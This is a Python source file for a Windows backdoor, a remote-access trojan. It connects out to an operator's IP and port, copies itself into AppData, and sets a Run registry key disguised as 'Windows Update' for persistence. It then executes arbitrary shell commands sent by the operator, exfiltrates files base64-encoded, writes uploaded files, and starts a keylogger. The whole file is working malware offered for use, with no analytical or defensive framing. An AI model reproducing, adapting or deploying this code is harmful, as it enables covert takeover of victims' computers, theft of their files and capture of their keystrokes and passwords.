import socket
import subprocess
import data
import json
import time
import shutil
import os
import base64
import sys
import fullkeylogger
import multiprocessing

class Backdoor:
    def __init__(self):
        try:
            self.persistence()
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((data.Initialize.ip, data.Initialize.port))
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.command = ''
            self.result = ''.encode('utf-8')
        except:
            time.sleep(5)
            self.__init__()

    def persistence(self):
        evil_loc = os.environ['appdata'] + "\\" + data.Initialize.file
        if not os.path.exists(evil_loc):
            shutil.copyfile(sys.executable, evil_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Update" /t REG_SZ /d "' + evil_loc + '"', shell=True)
            filename = sys._MEIPASS + data.Initialize.frontfile
            subprocess.Popen(filename, shell=True)

    def reliable_send(self, byte):
        json_data = json.dumps(byte)
        self.connection.sendall(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ''.encode('utf-8')
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except:
            return ('You typed [[' + str(command) + ']] which is wrong. Please recheck!!!').encode('utf-8')

    def chdir(self, path):
        os.chdir(path)
        return ("[+] Changing Working Directory to " + path)

    def pwd(self):
        return os.getcwd()

    def read(self, path):
        with open(path, "rb") as out_file:
            return base64.b64encode(out_file.read())

    def write(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+]Your file is Uploaded to " + path

    def run(self):
        while True:
            try:
                self.command = self.reliable_receive()
                if self.command[0] == 'exit':
                    try:
                        self.result = '[+]Program is exiting in 5 seconds...'
                        self.reliable_send(self.result)
                    finally:
                        time.sleep(2)
                        self.__init__()
                elif self.command[0] == 'cd':
                    try:
                        self.result = self.chdir(self.command[1]).encode('utf-8')
                    except:
                        self.result = 'Enter an argument for cd'.encode('utf-8')
                elif self.command[0] == 'pwd':
                    self.result = self.pwd().encode('utf-8')
                elif self.command[0] == 'download':
                    try:
                        self.result = self.read(self.command[1]).encode('utf-8')
                        print(self.command[1])
                        #print(self.result)
                    except:
                        self.result = '[-}Check the options given'.encode('utf-8')
                elif self.command[0] == 'upload':
                    if len(self.command) > 4:
                        self.result = 'Enter values that have only \'to\' and \'from\' paths'.encode('utf-8')
                    elif len(self.command) == 4:
                        try:
                            self.result = self.write(self.command[2], self.command[3]).encode('utf-8')
                        except:
                            self.result = "Your values do not seem correct".encode('utf-8')
                    elif len(self.command) == 3:
                        try:
                            self.result = self.write(self.command[1], self.command[2]).encode('utf-8')
                        except:
                            self.result = "Your values do not seem correct".encode('utf-8')
                elif self.command[0] == 'start_keylog':
                    startkeylog = fullkeylogger.Keylogger()
                    self.result = "[+] Keylogging Started".encode('utf-8')
                    self.t = multiprocessing.Process(target=startkeylog.start)
                    self.t.start()
                elif self.command[0] == 'stop_keylog':
                    try:
                        self.t.kill()
                        self.result = "[+] Keylogging Stopped".encode('utf-8')
                    except:
                        self.result = "[-] Keylogging was not on, so it cannot be stopped!".encode('utf-8')
                else:
                    self.result = self.execute(self.command)
                self.reliable_send(self.result.decode('utf-8'))
            except:
                self.__init__()
            # command = self.reliable_receive()




